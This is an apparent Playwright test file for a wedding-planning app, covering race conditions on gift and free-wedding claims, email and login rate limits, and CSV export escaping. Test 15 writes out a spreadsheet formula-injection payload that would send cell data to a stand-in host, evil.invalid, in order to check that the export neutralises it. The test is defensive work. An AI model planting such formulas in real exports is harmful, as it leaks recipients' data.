import { test, expect } from "@playwright/test";
import { seed, close, prisma, IDS, EMAILS } from "./seed";
import { signIn } from "./helpers";

/**
 * Cases 11–15: the limits that hold under concurrency and under volume.
 *
 * The race tests are the ones that justify this file existing. `races.test.ts`
 * proves the conditional `updateMany` is correct by calling the service twice
 * against a fake client; only a real database can show that two genuinely
 * simultaneous HTTP requests end with one winner, because the guarantee being
 * relied on is row-level locking inside Postgres.
 */

test.beforeAll(async () => {
  await seed();
});

test.afterAll(async () => {
  await close();
});

/* ------------------------------------------------------- gift claim (11) -- */

test("11 · two guests claiming one gift at the same instant produce exactly one winner", async ({
  browser,
}) => {
  const wedding = await prisma.wedding.findUniqueOrThrow({ where: { id: IDS.weddingB } });

  const claim = async (name: string) => {
    const ctx = await browser.newContext();
    const res = await ctx.request.post(`/w/${wedding.slug}/registry`, {
      form: { itemId: IDS.giftB, name, note: "" },
      maxRedirects: 0,
    });
    await ctx.close();
    return res.status();
  };

  // Fired together, not sequentially: a sequential pair passes even against the
  // read-then-write version this test exists to catch.
  await Promise.all([claim("Alex"), claim("Sam")]);

  const item = await prisma.registryItem.findUniqueOrThrow({ where: { id: IDS.giftB } });
  expect(item.purchasedBy, "exactly one claimant must be recorded").toBeTruthy();
  expect(["Alex", "Sam"]).toContain(item.purchasedBy);

  // And the loser must not have overwritten the winner: one row, one name.
  const claimed = await prisma.registryItem.count({
    where: { id: IDS.giftB, purchasedBy: { not: null } },
  });
  expect(claimed).toBe(1);
});

/* --------------------------------------------- free wedding claim (12) -- */

test("12 · the free wedding cannot be claimed twice by concurrent requests", async () => {
  await prisma.studio.update({
    where: { id: IDS.studioA },
    data: { freeWeddingUsed: false },
  });

  /**
   * Driven at the data layer rather than through the publish UI, because the
   * paid path needs Stripe and the point under test is the conditional write.
   * Two `updateMany` calls racing on `freeWeddingUsed: false` must produce one
   * count of 1 and one count of 0 — the loser falls through to the paid path.
   */
  const attempt = () =>
    prisma.studio.updateMany({
      where: { id: IDS.studioA, freeWeddingUsed: false },
      data: { freeWeddingUsed: true },
    });

  const [first, second] = await Promise.all([attempt(), attempt()]);
  const wins = [first.count, second.count].filter(n => n === 1).length;
  expect(wins, "the free wedding must be claimable exactly once").toBe(1);
});

/* ------------------------------------------------- invitation resend (13) -- */

test("13 · invitation resend is refused after the hourly limit", async ({ browser }) => {
  const planner = await signIn(browser, EMAILS.plannerA);

  // The limit is 3/hour per guest. The fourth must be refused rather than
  // silently accepted — this is the only send path with no invitedAt brake.
  const statuses: number[] = [];
  for (let i = 0; i < 5; i++) {
    const res = await planner.request.post(`/studio/weddings/${IDS.weddingA}/guests`, {
      form: { intent: "resend", guestId: IDS.guestA },
      maxRedirects: 0,
    });
    statuses.push(res.status());
  }

  const emailed = await prisma.emailLog.count({
    where: { studioId: IDS.studioA, to: { contains: IDS.guestA } },
  });
  expect(emailed, "no more than three invitations may leave for one guest in an hour")
    .toBeLessThanOrEqual(3);

  await planner.close();
});

/* ---------------------------------------------------- login throttle (14) -- */

test("14 · repeated bad passwords are throttled rather than answered at full speed", async ({
  browser,
}) => {
  const ctx = await browser.newContext();

  /**
   * The account limit is 10 failures in 15 minutes, with an escalating delay
   * from the 6th. Asserting on the redirect target rather than on timing: a
   * wall-clock assertion is the classic flaky test, and `?error=rate` is the
   * observable the throttle actually produces.
   */
  let sawRateLimit = false;
  for (let i = 0; i < 12; i++) {
    const res = await ctx.request.post("/login", {
      form: { email: EMAILS.plannerA, password: `wrong-${i}` },
      maxRedirects: 0,
    });
    const location = res.headers()["location"] ?? "";
    if (location.includes("error=rate")) {
      sawRateLimit = true;
      break;
    }
  }
  expect(sawRateLimit, "login must start refusing before 12 guesses").toBe(true);

  await ctx.close();
});

/* ------------------------------------------------- CSV neutralisation (15) -- */

test("15 · a formula typed into an RSVP note is neutralised in the CSV export", async ({
  browser,
}) => {
  const payload = `=HYPERLINK("https://evil.invalid?"&A1,"Invoice")`;

  await prisma.rsvp.upsert({
    where: { guestId: IDS.guestA },
    create: { guestId: IDS.guestA, status: "ATTENDING", notes: payload },
    update: { status: "ATTENDING", notes: payload },
  });
  // The other three shapes a spreadsheet will evaluate.
  await prisma.guest.update({
    where: { id: IDS.guestA },
    data: { name: "+1 555 0100" },
  });

  const planner = await signIn(browser, EMAILS.plannerA);
  const res = await planner.request.get(`/studio/weddings/${IDS.weddingA}/guests/export`);
  expect(res.status()).toBe(200);
  const csv = await res.text();

  // The value must still be present — neutralising by deleting data would be a
  // different bug — but never at the start of a cell where it would evaluate.
  expect(csv).toContain("HYPERLINK");
  expect(csv, "a cell must not open with a formula character").not.toMatch(/(^|,)"[=+\-@]/m);
  expect(csv, "the leading apostrophe is what stops evaluation").toContain(`"'=HYPERLINK`);
  expect(csv).toContain(`"'+1 555 0100"`);

  await planner.close();
});
